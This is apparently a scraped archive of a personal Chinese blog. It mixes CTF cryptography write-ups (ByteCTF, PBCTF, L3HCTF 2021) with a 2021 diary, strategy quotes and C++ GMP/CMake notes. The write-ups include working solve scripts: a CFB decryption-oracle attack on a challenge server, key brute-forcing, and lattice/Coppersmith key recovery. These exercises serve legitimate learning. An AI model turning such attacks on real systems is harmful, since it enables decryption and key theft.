kp=int(io.recvline()) io.recvuntil(\u0026#34;hash =\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) hsh=int(io.recvline()) (data[\u0026#34;signatures\u0026#34;]).append({\u0026#34;r\u0026#34;:r,\u0026#34;s\u0026#34;:s,\u0026#34;kp\u0026#34;:kp,\u0026#34;hash\u0026#34;:hsh}) f=open(\u0026#34;data.json\u0026#34;,\u0026#34;w\u0026#34;) import json f.write(json.dumps(data)) f.close() system(\u0026#34;python3 lattice_attack.py -f data.json\u0026#34;) d=eval(input(\u0026#34;plz input the ans\\n\u0026#34;)) io.sendline(str(d).encode(\u0026#34;utf-8\u0026#34;)) io.interactive() The curse of ECDSA nonces # In the question-44644 on stackexchange we know how to solve HNP of bias nonce ecdsa\nAnd Minerva: The curse of ECDSA nonces shows us the attack in detail\nObviously，the primitives is not what we should focus on\nremove U to raise speed？\nSo mul $2^\\ell$to T and U to\nadd a N to U\nSo，we make make an effort to make the boundary valid? :D\n","date":"14 November 2021","permalink":"/achieve/ctf/l3hctf2021/","section":"archive","summary":"","title":"L3HCTF2021"},{"content":" 笑死,xyb信号屏蔽拉满,蓝牙都不让用,只能来苟唯一一个不出网的题\n总得来说水平还是比较绝绝子，延续了字节去年炼丹题的的优良传统，\nEASYXOR # 主要难度在逆convert和猜ByteCTF{前缀大小写上🤭\nconvert\ndef shift(m, k, c): if k \u0026lt; 0: return m ^ (m \u0026gt;\u0026gt; (-k)) \u0026amp; c return m ^ ((m \u0026lt;\u0026lt; k) \u0026amp; c) 大概是因为有个位移导致部分数据泄露，分清左右顺序和前后一点点慢慢把m恢复出来\n大致流程如下：\ninv convert：\ndef invshift_opt(c,k,mask): c = bin(c)[2:].rjust(64,\u0026#39;0\u0026#39;) cip=[int(i) for i in c] mask = bin(mask)[2:].rjust(64,\u0026#39;0\u0026#39;) mask=[int(i) for i in mask] ans={} idx = 63 for i in range(k): ans[idx]=cip.pop() idx-=1 for i in range(63-k,-1,-1): tmp = cip[i]^(ans[i+k]\u0026amp;mask[i]) ans[i]=tmp flag =\u0026#39;\u0026#39; for i in range(64): flag += str(ans[i]) ans = int(flag,2) return ans def invshift_ngt(c,k,mask): k=-k c = bin(c)[2:].rjust(64,\u0026#39;0\u0026#39;) cip=[int(i) for i in c] mask = bin(mask)[2:].rjust(64,\u0026#39;0\u0026#39;) mask=[int(i) for i in mask] ans={} for i in range(k): ans[i]=cip[i] for i in range(k,64): tmp = cip[i]^(ans[i-k]\u0026amp;mask[i]) ans[i]=tmp flag =\u0026#39;\u0026#39; for i in range(64): flag += str(ans[i]) # ans=[str(ans[i]) for i in range(64)] # ans = \u0026#34;\u0026#34;.join(ans) ans = int(flag,2) return ans def invconvert(m, key): c_list = [0x37386180af9ae39e, 0xaf754e29895ee11a, 0x85e1a429a2b7030c, 0x964c5a89f6d3ae8c] for t in range(3,-1,-1): if(key[t]\u0026gt;0): m = invshift_opt(m, key[t], c_list[t]) else: m = invshift_ngt(m, key[t], c_list[t]) return m 然后打表爆破keys，把api全部拖出来用pypy几分钟就跑完了\n❯❯ easyxor 10:22 pypy3 .\\solve.py 5228891it [02:22, 34737.70it/s]b\u0026#39;15654747\u0026#39; b\u0026#39;5u2t}$$$\u0026#39; [-12, 26, -3, -31] 然后本题最难的地方来了，👴思索了2个小时愣是没有考虑前缀的情况\n拿着flag{xxx爆了半天\n然后才想起来学弟们打的是字节CTF\n然后祥云被场地没网，工作人员不知道把👴的手机放哪里了，热点都找不到，只能猜前缀了\n好在仗着👴不太优秀的变量命名功底给前缀ByteCTF{猜出来了\nsolve # from tqdm import tqdm # ----------------------------------- from itertools import * from expApi import * # pypy3爆破秘钥 ofb = \u0026#34;89b8aca257ee2748f030e7f6599cbe0cbb5db25db6d3990d\u0026#34; cbc = \u0026#34;3b752eda9689e30fa2b03ee748e0da3c989da2bba657b912\u0026#34; tab = [-32,-31, -30, -29, -28, -27, -26, -25, -24, -23, -22, -21, -20, -19, -18, -17, -16, -15, -14, -13, -12, -11, -10, -9, -8, -7, -6, -5, -4, -3, -2, -1, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31,32] c = [int(cbc[i:i+16],16) for i in range(0,48,16)] c2=c[1] c3=c[2] c1=c[0] for k in tqdm(product(tab,repeat=4)): keys = list(k) # keys = [16 for _ in range(4)] # IV = 10708643912928985573 tmp = invconvert(c3,keys) g3 = long_to_bytes(tmp^c2) if(check(g3)==True): tmp = invconvert(c2,keys) g2 = long_to_bytes(tmp^c1) # print(g2) # print(g3) # print(keys) if(check(g2)==True): print(g2) print(g3) print(keys) # keys = [-12, 26, -3, -31] def getiv(keys,ofb): c = [int(ofb[i:i+16],16) for i in range(0,48,16)] m21 =bytes_to_long( b\u0026#39;ByteCTF{\u0026#39;) IV = invconvert(m21^c[0],keys) return IV keys = [-12, 26, -3, -31] ofb = \u0026#34;89b8aca257ee2748f030e7f6599cbe0cbb5db25db6d3990d\u0026#34; cbc = \u0026#34;3b752eda9689e30fa2b03ee748e0da3c989da2bba657b912\u0026#34; IV = getiv(keys,ofb) # CBC iv = IV groups = [] c = [int(cbc[i:i+16],16) for i in range(0,48,16)] c3 = c[2] c2 = c[1] for i in range(3): tmp = invconvert(c[i],keys) groups.append(tmp^iv) iv = c[i] flag2 = b\u0026#39;\u0026#39;.join( [long_to_bytes(i) for i in groups]) # OFB iv = IV groups = [] c = [int(ofb[i:i+16],16) for i in range(0,48,16)] for i in range(3): tmp = convert(iv,keys) g = c[i]^tmp groups.append(g) iv = tmp flag1 = b\u0026#39;\u0026#39;.join( [long_to_bytes(i) for i in groups]) print(flag1+flag2) # ByteCTF{5831a241s-f30980q535af-2156547475u2t}$$$ expApi # import struct import sys def bytes_to_long(s): \u0026#34;\u0026#34;\u0026#34;Convert a byte string to a long integer (big endian). In Python 3.2+, use the native method instead:: \u0026gt;\u0026gt;\u0026gt; int.from_bytes(s, \u0026#39;big\u0026#39;) For instance:: \u0026gt;\u0026gt;\u0026gt; int.from_bytes(b\u0026#39;\\x00P\u0026#39;, \u0026#39;big\u0026#39;) 80 This is (essentially) the inverse of :func:`long_to_bytes`. \u0026#34;\u0026#34;\u0026#34; acc = 0 unpack = struct.unpack # Up to Python 2.7.4, struct.unpack can\u0026#39;t work with bytearrays nor # memoryviews if sys.version_info[0:3] \u0026lt; (2, 7, 4): if isinstance(s, bytearray): s = bytes(s) elif isinstance(s, memoryview): s = s.tobytes() length = len(s) if length % 4: extra = (4 - length % 4) s = b\u0026#39;\\x00\u0026#39; * extra + s length = length + extra for i in range(0, length, 4): acc = (acc \u0026lt;\u0026lt; 32) + unpack(\u0026#39;\u0026gt;I\u0026#39;, s[i:i+4])[0] return acc def long_to_bytes(n, blocksize=0): \u0026#34;\u0026#34;\u0026#34;Convert an integer to a byte string. In Python 3.2+, use the native method instead:: \u0026gt;\u0026gt;\u0026gt; n.to_bytes(blocksize, \u0026#39;big\u0026#39;) For instance:: \u0026gt;\u0026gt;\u0026gt; n = 80 \u0026gt;\u0026gt;\u0026gt; n.to_bytes(2, \u0026#39;big\u0026#39;) b\u0026#39;\\x00P\u0026#39; If the optional :data:`blocksize` is provided and greater than zero, the byte string is padded with binary zeros (on the front) so that the total length of the output is a multiple of blocksize. If :data:`blocksize` is zero or not provided, the byte string will be of minimal length. \u0026#34;\u0026#34;\u0026#34; # after much testing, this algorithm was deemed to be the fastest s = b\u0026#39;\u0026#39; n = int(n) pack = struct.pack while n \u0026gt; 0: s = pack(\u0026#39;\u0026gt;I\u0026#39;, n \u0026amp; 0xffffffff) + s n = n \u0026gt;\u0026gt; 32 # strip off leading zeros for i in range(len(s)): if s[i] != b\u0026#39;\\x00\u0026#39;[0]: break else: # only happens when n == 0 s = b\u0026#39;\\x00\u0026#39; i = 0 s = s[i:] # add back some pad bytes. this could be done more efficiently w.r.t. the # de-padding being done above, but sigh... if blocksize \u0026gt; 0 and len(s) % blocksize: s = (blocksize - len(s) % blocksize) * b\u0026#39;\\x00\u0026#39; + s return s def check(s): for i in s: if(i\u0026gt;32 and i\u0026lt;127): continue else: return False return True def shift(m, k, c): if k \u0026lt; 0: return m ^ (m \u0026gt;\u0026gt; (-k)) \u0026amp; c return m ^ ((m \u0026lt;\u0026lt; k) \u0026amp; c) def convert(m, key): c_list = [0x37386180af9ae39e, 0xaf754e29895ee11a, 0x85e1a429a2b7030c, 0x964c5a89f6d3ae8c] for t in range(4): m = shift(m, key[t], c_list[t]) return m def invshift_opt(c,k,mask): c = bin(c)[2:].rjust(64,\u0026#39;0\u0026#39;) cip=[int(i) for i in c] mask = bin(mask)[2:].rjust(64,\u0026#39;0\u0026#39;) mask=[int(i) for i in mask] ans={} idx = 63 for i in range(k): ans[idx]=cip.pop() idx-=1 for i in range(63-k,-1,-1): tmp = cip[i]^(ans[i+k]\u0026amp;mask[i]) ans[i]=tmp flag =\u0026#39;\u0026#39; for i in range(64): flag += str(ans[i]) ans = int(flag,2) return ans def invshift_ngt(c,k,mask): k=-k c = bin(c)[2:].rjust(64,\u0026#39;0\u0026#39;) cip=[int(i) for i in c] mask = bin(mask)[2:].rjust(64,\u0026#39;0\u0026#39;) mask=[int(i) for i in mask] ans={} for i in range(k): ans[i]=cip[i] for i in range(k,64): tmp = cip[i]^(ans[i-k]\u0026amp;mask[i]) ans[i]=tmp flag =\u0026#39;\u0026#39; for i in range(64): flag += str(ans[i]) ans = int(flag,2) return ans def invconvert(m, key): c_list = [0x37386180af9ae39e, 0xaf754e29895ee11a, 0x85e1a429a2b7030c, 0x964c5a89f6d3ae8c] for t in range(3,-1,-1): if(key[t]\u0026gt;0): m = invshift_opt(m, key[t], c_list[t]) else: m = invshift_ngt(m, key[t], c_list[t]) return m document for JustDecrypt # 还是比较有意思的炼丹题，有点CBC打oracle的感觉，总得来说还是比较有意思\ntask\n#!/usr/bin/env python3.9 # -*- coding: utf-8 -*- import string import random import socketserver import signal import codecs from os import urandom from hashlib import sha256 from Crypto.Cipher import AES from flag import FLAG BANNER = rb\u0026#34;\u0026#34;\u0026#34; ___ _ ______ _ |_ | | | | _ \\ | | | |_ _ ___| |_ | | | |___ ___ _ __ _ _ _ __ | |_ | | | | / __| __| | | | / _ \\/ __| \u0026#39;__| | | | \u0026#39;_ \\| __| /\\__/ / |_| \\__ \\ |_ | |/ / __/ (__| | | |_| | |_) | |_ \\____/ \\__,_|___/\\__| |___/ \\___|\\___|_| \\__, | .__/ \\__| __/ | | |___/|_| \u0026#34;\u0026#34;\u0026#34; BLOCK_SIZE = 16 class AES_CFB(object): def __init__(self): self.key = urandom(BLOCK_SIZE) self.iv = urandom(16) self.aes_encrypt = AES.new(self.key, AES.MODE_CFB, self.iv) self.aes_decrypt = AES.new(self.key, AES.MODE_CFB, self.iv) def encrypt(self, plain): return self.aes_encrypt.encrypt(self.pad(plain)) def decrypt(self, cipher): return self.unpad(self.aes_decrypt.decrypt(cipher)) @staticmethod def pad(s): num = BLOCK_SIZE - (len(s) % BLOCK_SIZE) return s + bytes([num] * num) @staticmethod def unpad(s): return s[:-s[-1]] class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 1024 data = b\u0026#39;\u0026#39; while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u0026lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b\u0026#39;\\n\u0026#39; self.request.sendall(msg) except: pass def recv(self, prompt=b\u0026#39;\u0026gt; \u0026#39;): self.send(prompt, newline=False) return self._recvall() def proof_of_work(self): random.seed(urandom(32)) alphabet = string.ascii_letters + string.digits proof = \u0026#39;\u0026#39;.join(random.choices(alphabet, k=32)) hash_value = sha256(proof.encode()).hexdigest() self.send(f\u0026#39;sha256(XXXX+{proof[4:]}) == {hash_value}\u0026#39;.encode()) nonce = self.recv(prompt=b\u0026#39;Give me XXXX \u0026gt; \u0026#39;) if len(nonce) != 4 or sha256(nonce + proof[4:].encode()).hexdigest() != hash_value: return False return True def timeout_handler(self, signum, frame): raise TimeoutError def handle(self): try: signal.signal(signal.SIGALRM, self.timeout_handler) signal.alarm(60) self.send(BANNER) # if not self.proof_of_work(): # self.send(b\u0026#39;\\nWrong!\u0026#39;) # self.request.close() # return self.send(b\u0026#34;It\u0026#39;s just a decryption system. And I heard that only the Bytedancer can get secret.\u0026#34;) aes = AES_CFB() # signal.alarm(300) for i in range(52): cipher_hex = self.recv(prompt=b\u0026#39;Please enter your cipher in hex \u0026gt; \u0026#39;) if len(cipher_hex) \u0026gt; 2048: self.send(b\u0026#34;It\u0026#39;s too long!\u0026#34;) continue try: cipher = codecs.decode(cipher_hex, \u0026#39;hex\u0026#39;) except: self.send(b\u0026#39;Not hex data!\u0026#39;) continue if len(cipher) == 0 or len(cipher) % BLOCK_SIZE != 0: self.send(f\u0026#39;Cipher length must be a multiple of {BLOCK_SIZE}!\u0026#39;.encode()) continue plaintext = aes.decrypt(cipher) plaintext_hex = codecs.encode(plaintext, \u0026#39;hex\u0026#39;) self.send(b\u0026#39;Your plaintext in hex: \\n%s\\n\u0026#39; % plaintext_hex) if plaintext == b\u0026#34;Hello, I\u0026#39;m a Bytedancer. Please give me the flag!\u0026#34;: self.send(b\u0026#39;OK! Here is your flag: \u0026#39;) self.send(FLAG.encode()) break self.send(b\u0026#39;Bye!\\n\u0026#39;) except TimeoutError: self.send(b\u0026#39;\\nTimeout!\u0026#39;) except Exception as err: self.send(b\u0026#39;Something Wrong!\u0026#39;) finally: self.request.close() class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 30002 print(HOST, PORT) server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 大抵是一下几个知识点：\nCFB模式机制 如何padding oracle 输入一个消息块来设置定长iv\n输入\\x00参数来获取流秘钥跑64次可以完全oracle\n跑不满64次也可以对低位嗯猜\nfrom Crypto.Util.number import * from pwn import * from tqdm import tqdm def main(): r = remote(\u0026#39;0.0.0.0\u0026#39;, \u0026#39;30002\u0026#39;) plaintext = b\u0026#34;Hello, I\u0026#39;m a Bytedancer. Please give me the flag!\u0026#34;+b\u0026#34;\\x0f\u0026#34;*15 def my_XOR(a, b): assert len(a) == len(b) return b\u0026#39;\u0026#39;.join([long_to_bytes(a[i]^b[i]) for i in range(len(a))]) def proof_of_work(): rev = r.recvuntil(b\u0026#34;sha256(XXXX+\u0026#34;) suffix = r.recv(28).decode() rev = r.recvuntil(b\u0026#34; == \u0026#34;) tar = r.recv(64).decode() def f(x): hashresult = hashlib.sha256(x.encode()+suffix.encode()).hexdigest() return hashresult == tar prefix = util.iters.mbruteforce(f, string.digits + string.ascii_letters, 4, \u0026#39;upto\u0026#39;) r.recvuntil(b\u0026#39;Give me XXXX \u0026gt; \u0026#39;) r.sendline(prefix.encode()) def decrypt(msg): newmsg = msg + b\u0026#39;\\x00\u0026#39;*(256+64-len(msg)) r.recvuntil(b\u0026#39;Please enter your cipher in hex \u0026gt; \u0026#39;) r.sendline(newmsg.hex().encode()) r.recvline() result = r.recvline().decode().strip() return bytes.fromhex(result) def decrypt_(msg): newmsg = msg + b\u0026#39;\\x00\u0026#39;*(256-len(msg)) r.recvuntil(b\u0026#39;Please enter your cipher in hex \u0026gt; \u0026#39;) r.sendline(newmsg.hex().encode()) r.recvline() result = r.recvline().decode().strip() return bytes.fromhex(result) # proof_of_work() msg = b\u0026#39;\\x00\u0026#39;*16 decrypt(msg) c = b\u0026#34;\u0026#34; for i in range(50): t = decrypt(c)[i] c += long_to_bytes(t^plaintext[i]) decc = decrypt_(c) print(decc) res = r.recvline()+r.recvline() if b\u0026#34;Here is your flag\u0026#34; in res: print(r.recvline()) print(r.recvline()) r.close() return (True, len(decc)) r.close() return (False, len(decc)) ll = [] while True: ss = main() ll.append(ss[1]) if ss[0]: break print(len(ll), ll) ","date":"20 October 2021","permalink":"/achieve/ctf/bytectf2021/","section":"archive","summary":"","title":"writeUP for ByteCTF 2021"},{"content":"一晃眼2021就快过去一大半了,本来准备放假写的\n一晃眼2021就快过去了\n干脆忙里偷闲搞一点吧\n虽然跑到外面去也不知道玩什么,景点也懒得去,忙着赶路和做决定不知不觉浪费了一堆时间\n但还是想跑出去玩\n一年就这样浑浑噩噩地过去了，得到什么失去什么也不好说\n总之逞着还有干劲，多提高单位时间利用率吧😩\n上半年 # 李老板请吃饭 可喜可贺可喜可贺\n长江带桥\n下半年 # 啊傻逼了刷机把数据备份搞没了，我的暑假什么都没留下\n罚坐 好！\n事新平板哦\n夏日限定（果然只有和朋友一起烤肉才能搓到人均150。。。）\n一年半没回去看了\n让人掉san\u0026hellip;.欲罢不能\u0026hellip;.就是说\n嘿嘿嘿🤤🤤🤤小猫咪🤤🤤🤤\n溜了溜了\n川航的空姐小姐姐很漂亮😲😲😲巴蜀利亚赛高\n吃\nstroll\n坐上兄弟的车了XXXXD\n什么时候去考个驾照吧XXD\n","date":"20 October 2021","permalink":"/achieve/loving-2021/","section":"archive","summary":"","title":"loving-2021"},{"content":"\rPBCTF2021 # A CTF event with highly speaking by perfect-blue team.\nAlkaloid Stream # #!/usr/bin/env python3 import random from flag import flag def keygen(ln): # Generate a linearly independent key arr = [ 1 \u0026lt;\u0026lt; i for i in range(ln) ] for i in range(ln): for j in range(i): if random.getrandbits(1): arr[j] ^= arr[i] for i in range(ln): for j in range(i): if random.getrandbits(1): arr[ln - 1 - j] ^= arr[ln - 1 - i] return arr def gen_keystream(key): ln = len(key) # Generate some fake values based on the given key... fake = [0] * ln for i in range(ln): for j in range(ln // 3): if i + j + 1 \u0026gt;= ln: break fake[i] ^= key[i + j + 1] # Generate the keystream res = [] for i in range(ln): t = random.getrandbits(1) if t: res.append((t, [fake[i], key[i]])) else: res.append((t, [key[i], fake[i]])) # Shuffle! random.shuffle(res) keystream = [v[0] for v in res] public = [v[1] for v in res] return keystream, public def xor(a, b): return [x ^ y for x, y in zip(a, b)] def recover_keystream(key, public): st = set(key) keystream = [] for v0, v1 in public: if v0 in st: keystream.append(0) elif v1 in st: keystream.append(1) else: assert False, \u0026#34;Failed to recover the keystream\u0026#34; return keystream def bytes_to_bits(inp): res = [] for v in inp: res.extend(list(map(int, format(v, \u0026#39;08b\u0026#39;)))) return res def bits_to_bytes(inp): res = [] for i in range(0, len(inp), 8): res.append(int(\u0026#39;\u0026#39;.join(map(str, inp[i:i+8])), 2)) return bytes(res) flag = bytes_to_bits(flag) key = keygen(len(flag)) keystream, public = gen_keystream(key) assert keystream == recover_keystream(key, public) enc = bits_to_bytes(xor(flag, keystream)) print(enc.hex()) print(public) simple algebraic problem\nfake has always a 0 element,we can recover the key and flag-stream step by step.\nsolve by my teammates\nfrom Crypto.Util.number import * from data import * keys = [] tmp = pub.copy() for key in tmp: if key[0] == 0: keys.append(key[1]) tmp.remove(key) print(\u0026#39;last key:\u0026#39; + str(key[1])) elif key[1] == 0: keys.append(key[0]) tmp.remove(key) print(\u0026#39;last key:\u0026#39; + str(key[0])) fake = keys[0] for _ in range(len(pub) - 1): for key in tmp: if key[0] == fake: keys.insert(0, key[1]) tmp.remove(key) fake = 0 elif key[1] == fake: keys.insert(0, key[0]) tmp.remove(key) fake = 0 if len(keys) \u0026lt;= len(pub) // 3: for i in keys: fake ^= i else: for i in keys[:len(pub)//3]: fake ^= i print(len(keys)) print(keys) def recover_keystream(key, public): st = set(key) keystream = \u0026#39;\u0026#39; for v0, v1 in public: if v0 in st: keystream += \u0026#39;0\u0026#39; elif v1 in st: keystream += \u0026#39;1\u0026#39; else: assert False, \u0026#34;Failed to recover the keystream\u0026#34; return keystream stream = recover_keystream(keys, pub) print(strxor(long_to_bytes(int(stream, 2)), long_to_bytes(cipher))) # pbctf{super_duper_easy_brute_forcing_actually_this_one_was_made_by_mistake} Yet Another RSA # A varant RSA cryptosystem based on a cubic Pell\nHow the rsa implement by this strange formula(rcubic Pell) # Rules of ADD operation # solve # The left of the paper shows me the POC in theory,and\r@mystizshows the analysis result of data-range\n$0​≡k\\phi +1≡k(p ^2 +p+1)(q ^2 +q+1)+1$\n$≡k[n ^2 +n+1+(n+1)(p+q)+(p ^2 +q ^2)]+1(mod e)$\nThere are three unknown elements: $k \\approx d \\approx 2^{400}$, $p+q \\approx 2^{512}$ and $p^2 + q^2 \\approx 2^{1024}$ ​\nAnd $e\\approx 2^{2048}$,$2048\u0026gt;1024+512+400$\nwe can use coppersmith to attack it\n#! /usr/bin/sage from time import time from sage.all import * from sage.groups.generic import bsgs from Crypto.Util.number import * import itertools from tqdm import tqdm from rich.progress import track from rich.traceback import install install() from time import * p1 = time() # ----------------------------------- def add(P, Q, mod): m, n = P p, q = Q if p is None: return P if m is None: return Q if n is None and q is None: x = m * p % mod y = (m + p) % mod return (x, y) if n is None and q is not None: m, n, p, q = p, q, m, n if q is None: if (n + p) % mod != 0: x = (m * p + 2) * inverse(n + p, mod) % mod y = (m + n * p) * inverse(n + p, mod) % mod return (x, y) elif (m - n ** 2) % mod != 0: x = (m * p + 2) * inverse(m - n ** 2, mod) % mod return (x, None) else: return (None, None) else: if (m + p + n * q) % mod != 0: x = (m * p + (n + q) * 2) * inverse(m + p + n * q, mod) % mod y = (n * p + m * q + 2) * inverse(m + p + n * q, mod) % mod return (x, y) elif (n * p + m * q + 2) % mod != 0: x = (m * p + (n + q) * 2) * inverse(n * p + m * q + 2, mod) % mod return (x, None) else: return (None, None) def power_mul(P, a, mod): res = (None, None) t = P while a \u0026gt; 0: if a % 2: res = add(res, t, mod) t = add(t, t, mod) a \u0026gt;\u0026gt;= 1 return res def small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m+1): base = N^(m-i) * f^i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1/factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B*monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return [] N= int(144256630216944187431924086433849812983170198570608223980477643981288411926131676443308287340096924135462056948517281752227869929565308903867074862500573343002983355175153511114217974621808611898769986483079574834711126000758573854535492719555861644441486111787481991437034260519794550956436261351981910433997) e= int(3707368479220744733571726540750753259445405727899482801808488969163282955043784626015661045208791445735104324971078077159704483273669299425140997283764223932182226369662807288034870448194924788578324330400316512624353654098480234449948104235411615925382583281250119023549314211844514770152528313431629816760072652712779256593182979385499602121142246388146708842518881888087812525877628088241817693653010042696818501996803568328076434256134092327939489753162277188254738521227525878768762350427661065365503303990620895441197813594863830379759714354078526269966835756517333300191015795169546996325254857519128137848289) R = Integers(e) PR.\u0026lt;p_q, k\u0026gt; = PolynomialRing(R) f = k * (N**2 + N*p_q + p_q**2 - N + p_q + 1) + 1 bounds = (2**513, 2**400) print(\u0026#34;strating LLL\u0026#34;) p_q, k = small_roots(f, bounds, m=3, d=4)[0] p_q = 24061328198598730023892644418337616625129173971437927448877972244319015467758683782803490794256724311673381106878622466514439272631375460573992290498030162 k = 245962077700976781389651438762467784060458007726399012831680541230865888041508191613184353923990248850900264645309752826 print(p_q,k) E = 123436198430194873732325455542939262925442894550254585187959633871500308906724541691939878155254576256828668497797665133666948295292931357138084736429120687210965244607624309318401630252879390876690703745923686523066858970889657405936739693579856446294147129278925763917931193355009144768735837045099705643710, 47541273409968525787215157367345217799670962322365266620205138560673682435124261201490399745911107194221278578548027762350505803895402642361588218984675152068555850664489960683700557733290322575811666851008831807845676036420822212108895321189197516787046785751929952668898176501871898974249100844515501819117 PR.\u0026lt;x\u0026gt; = PolynomialRing(ZZ) f = x**2 - int(p_q) * x + N (p, _), (q, _) = f.roots() phi = (p ** 2 + p + 1) * (q ** 2 + q + 1) d = int(pow(e, -1, phi)) tmp = power_mul(E, d, N) flag1 = long_to_bytes(tmp[0])[:35].decode() flag2 = long_to_bytes(tmp[1])[:36].decode() print(flag1+flag2 ) # [(245962077700976781389651438762467784060458007726399012831680541230865888041508191613184353923990248850900264645309752826, 24061328198598730023892644418337616625129173971437927448877972244319015467758683782803490794256724311673381106878622466514439272631375460573992290498030162)] # pbctf{I_love_to_read_crypto_papers_and_implement_the_attacks_from_them} p2 = time() print(p2-p1) ","date":"18 October 2021","permalink":"/achieve/ctf/pbctf2021/","section":"archive","summary":"","title":"Personal document of cryptoChallenges for PBCTF2021"},{"content":"在战略上要藐视敌人 在战术上要重视敌人\n战争论 # 战争不是消遣，不是一种追求冒险和赌输赢的纯粹的娱乐，也不是灵机一动的产物，而是为了达到严肃的目的而采取的严肃的手段。\n危险中最可贵的精神力量是什么？勇气\n军争 # 故不知諸侯之謀者，不能豫交﹔不知山林、險阻、沮澤之形者，不能行軍﹔不用 鄉導者，不能得地利。\n故兵以詐立，以利動，以分和為變者也。\n故其疾如風，其徐如林，侵掠如火，不動如山，難知如陰，動如雷震。\n掠鄉分眾，廓地分守，懸權而動。\n先知迂直之計者勝，此軍爭之法也。\n故三軍可奪氣，將軍可奪心。是故朝氣銳，晝氣惰，暮氣歸。故善用兵者，避其 銳氣，擊其惰歸，此治氣者也。以治待亂，以靜待嘩，此治心者也。以近待遠， 以佚待勞，以飽待飢，此治力者也。無邀正正之旗，無擊堂堂之陣，此治變者也。\n故用兵之法，高陵勿向，背丘勿逆，佯北勿從，銳卒勿攻，餌兵勿食，歸師勿遏 ，圍師遺闕，窮寇勿迫，此用兵之法也。\n势 # 激水之疾,至于漂石者,势也;鸷鸟之疾,至于毁折者,节也。是故善战者,其势险,其节短。势如弩,节如发机。\n故善战者,求之于势,不责于人,故能择人而任势。任势者,其战人也,如转木石。 木石之性,安则静,危则动,方则止,圆则行。故善战人之势,如转圆石于千仞之山者,势也\n君主论 # 所有武装的先知都获得胜利，而非武装的先知都失败了\ncipher punk # 强大的密码术能够抵抗无限施加的暴力。任何暴力都无法解决一道数学问题。\n","date":"30 September 2021","permalink":"/achieve/sentence/","section":"archive","summary":"","title":"drunk gibberish"},{"content":" 花两天时间复习了一下c\ngmp # GNU MP库是一个大整数和多精度浮点数的运算库。它本身是用C语言写成的，但也提供了C++绑定。\n当用C++写程序时，如果你不是自虐狂或者狂热的手动编译器变换爱好者，那么用C++绑定毫无疑问是更好的选择。\n这是因为，C语言版本的绑定把所有操作都封装成了类似于汇编语言中的指令。比如说，如果要算一个大整数版本的a+b，那么应该这么写：\nmpz_t a, b, c; mpz_init_set_ui(a, 1); mpz_init_set_ui(b, 2); mpz_add(c, a, b); mpz_clear(a); mpz_clear(b); mpz_clear(c); 光是定义变量和清理内存就已经把孩子整吐了\n这种情况的根本原因是，C语言中没有方便的手段来进行内存资源管理和快速结构构造\n导致C语言虽然可以实现表达式求值模型，但无法方便地实现自定义类型的表达式求值模型\nC++绑定这时堪称救世主，极大地减轻了被python毒害的人的思考负担：\nconst mpz_class a {1}, b {2}; const auto c = a + b; 这段代码可以执行和上面C语言代码完全相同的行为\n看了一眼源码，只能说学到很多\n运算符重载：\n// compound assignments __GMP_DECLARE_COMPOUND_OPERATOR(operator+=) __GMP_DECLARE_COMPOUND_OPERATOR(operator-=) __GMP_DECLARE_COMPOUND_OPERATOR(operator*=) __GMP_DECLARE_COMPOUND_OPERATOR(operator/=) __GMP_DECLARE_COMPOUND_OPERATOR_UI(operator\u0026lt;\u0026lt;=) __GMP_DECLARE_COMPOUND_OPERATOR_UI(operator\u0026gt;\u0026gt;=) __GMP_DECLARE_INCREMENT_OPERATOR(operator++) __GMP_DECLARE_INCREMENT_OPERATOR(operator--) 实现一个pow：\n可以看到对于一般的运算符编写来说，我们习惯于去疯狂嵌套一个公式出来\n但gmpxx涉及到临时变量的地方，需要我们手动设置一个专用的临时变量（和其他运算符重载的操作是一样的）\nmpz_class powerMod(mpz_class b, mpz_class n, mpz_class m) { mpz_class a {1}; int i; int k=0; mpz_class num = n; mpz_class tmp; while(num) { num = num\u0026gt;\u0026gt;1; ++k; } for(i=0; i\u0026lt;k; ++i) { tmp = n\u0026gt;\u0026gt;i; tmp = tmp \u0026amp;1; if(tmp == 1) a = a*b %m; b = b*b %m; } return a; } RAII # RAII，也称为“资源获取就是初始化”，是C++等编程语言常用的管理资源、避免内存泄露的方法。它保证在任何情况下，使用对象时先构造对象，最后析构对象。\n智能指针（std::shared_ptr和std::unique_ptr）即RAII最具代表的实现，使用智能指针，可以实现自动的内存管理，再也不需要担心忘记delete造成的内存泄漏。\n但根据pwn👴的描述,还是有洞可以打,但是这项技术拔👴的工作量降低了,还是整挺好\n与cmake斗智斗勇 # 一个模板cmakelist：\n# 版本号 cmake_minimum_required(VERSION 3.0) PROJECT(Test) # 设置变量 set(PROJECT_ROOT ${CMAKE_CURRENT_LIST_DIR}) message(\u0026#34;project dir:${PROJECT_ROOT}\u0026#34;) # 头文件目录 INCLUDE_DIRECTORIES(./include/) # INCLUDE_DIRECTORIES(/usr/local/include/) # 设置源码文件位置 AUX_SOURCE_DIRECTORY(./src/ DIR_SRCS) # 设置编译器版本 SET(CMAKE_CXX_STANDARD 11) # bin文件位置 add_executable(test ${DIR_SRCS}) 运行完事了就会有一个熟悉的build目录了\n","date":"27 September 